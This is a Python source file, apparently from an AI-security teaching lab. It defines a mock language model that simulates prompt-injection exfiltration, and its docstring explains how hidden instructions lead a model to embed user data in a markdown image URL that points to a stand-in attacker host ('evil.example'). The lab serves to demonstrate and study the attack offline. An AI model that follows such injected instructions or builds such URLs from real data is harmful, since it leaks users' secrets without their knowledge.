"""A mock model that follows "put the data in this URL" instructions.

``MockLLM`` (see ``aisec_lab/llm.py``) already copies whatever is in a ``<context>``
block into its answer - so anything you put in context can leak. Real exfiltration
attacks go one step further: hidden text tells the model to *build a URL* that
carries the user's data, inside a markdown image. The chat UI renders the image, the
browser fetches the URL, and the data leaves with zero clicks.

This subclass adds exactly that behavior, so the lab can show it offline:

* If the answer contains the placeholder ``{DATA}`` (for example in
  ``![x](https://evil.example/p.png?d={DATA})``), the model fills it with every
  sensitive-looking value it can see in its prompt: canaries, account IDs, emails.

Everything is synthetic: canaries, ``*.example`` domains, fictional phone numbers.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from urllib.parse import quote

from aisec_lab import Message, MockLLM

SENSITIVE = re.compile(
    r"\b(?:CANARY|SECRET|ACCT)-[0-9A-Za-z-]{4,}\b|[\w.+-]+@[\w-]+(?:\.[\w-]+)*\.example\b"
)


@dataclass
class ExfilProneLLM(MockLLM):
    name: str = "mock-exfil-prone-1"

    def complete(self, messages: list[Message]) -> str:
        output = super().complete(messages)
        if "{DATA}" in output:
            prompt = "\n".join(m["content"] for m in messages)
            found = list(dict.fromkeys(SENSITIVE.findall(prompt)))  # unique, in order
            output = output.replace("{DATA}", quote(",".join(found)))
        return output
